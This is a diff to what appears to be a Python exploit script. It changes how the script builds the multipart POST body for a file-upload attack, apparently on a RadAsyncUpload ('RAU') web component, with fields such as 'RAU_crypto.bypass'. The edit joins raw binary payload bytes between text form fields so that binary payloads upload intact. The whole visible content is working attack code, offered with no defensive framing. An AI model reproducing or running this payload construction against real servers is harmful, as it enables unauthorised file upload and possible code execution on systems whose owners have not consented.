@@ -227,34 +227,37 @@ def payload(TempTargetFolder, Version, payload_filename):
     payload_file_data = payload_file.read()
     payload_file.close()
 
-    data = rauPostData_prep(TempTargetFolder, Version)
-    data += "-----------------------------62616f37756f2f\r\n"
-    data += "Content-Disposition: form-data; name=\"file\"; filename=\"blob\"\r\n"
-    data += "Content-Type: application/octet-stream\r\n"
-    data += "\r\n"
-    data += payload_file_data.decode("raw_unicode_escape") + "\r\n"
-    data += "-----------------------------62616f37756f2f\r\n"
-    data += "Content-Disposition: form-data; name=\"fileName\"\r\n"
-    data += "\r\n"
-    data += "RAU_crypto.bypass\r\n"
-    data += "-----------------------------62616f37756f2f\r\n"
-    data += "Content-Disposition: form-data; name=\"contentType\"\r\n"
-    data += "\r\n"
-    data += "text/html\r\n"
-    data += "-----------------------------62616f37756f2f\r\n"
-    data += "Content-Disposition: form-data; name=\"lastModifiedDate\"\r\n"
-    data += "\r\n"
-    data += "2019-01-02T03:04:05.067Z\r\n"
-    data += "-----------------------------62616f37756f2f\r\n"
-    data += "Content-Disposition: form-data; name=\"metadata\"\r\n"
-    data += "\r\n"
-    data += "{\"TotalChunks\":1,\"ChunkIndex\":0,\"TotalFileSize\":1,\"UploadID\":\"" + \
-            payload_filebasename + "\"}\r\n"
-    data += "-----------------------------62616f37756f2f--\r\n"
-    data += "\r\n"
+    data1 = rauPostData_prep(TempTargetFolder, Version)
+    data1 += "-----------------------------62616f37756f2f\r\n"
+    data1 += "Content-Disposition: form-data; name=\"file\"; filename=\"blob\"\r\n"
+    data1 += "Content-Type: application/octet-stream\r\n"
+    data1 += "\r\n"
+
+    data2 = "\r\n"
+    data2 += "-----------------------------62616f37756f2f\r\n"
+    data2 += "Content-Disposition: form-data; name=\"fileName\"\r\n"
+    data2 += "\r\n"
+    data2 += "RAU_crypto.bypass\r\n"
+    data2 += "-----------------------------62616f37756f2f\r\n"
+    data2 += "Content-Disposition: form-data; name=\"contentType\"\r\n"
+    data2 += "\r\n"
+    data2 += "text/html\r\n"
+    data2 += "-----------------------------62616f37756f2f\r\n"
+    data2 += "Content-Disposition: form-data; name=\"lastModifiedDate\"\r\n"
+    data2 += "\r\n"
+    data2 += "2019-01-02T03:04:05.067Z\r\n"
+    data2 += "-----------------------------62616f37756f2f\r\n"
+    data2 += "Content-Disposition: form-data; name=\"metadata\"\r\n"
+    data2 += "\r\n"
+    data2 += "{\"TotalChunks\":1,\"ChunkIndex\":0,\"TotalFileSize\":1,\"UploadID\":\"" + payload_filebasename + "\"}\r\n"
+    data2 += "-----------------------------62616f37756f2f--\r\n"
+    data2 += "\r\n"
+
+    # Concatenate text fields with binary data.
+    with open(payload_filename, "rb") as f:
+        data = bytes(data1, 'utf8') + f.read() + bytes(data2, 'utf8')
     sys.stderr.write("Payload prep done\n")
     return data
-
 
 def upload(data, url, proxy = False):
 
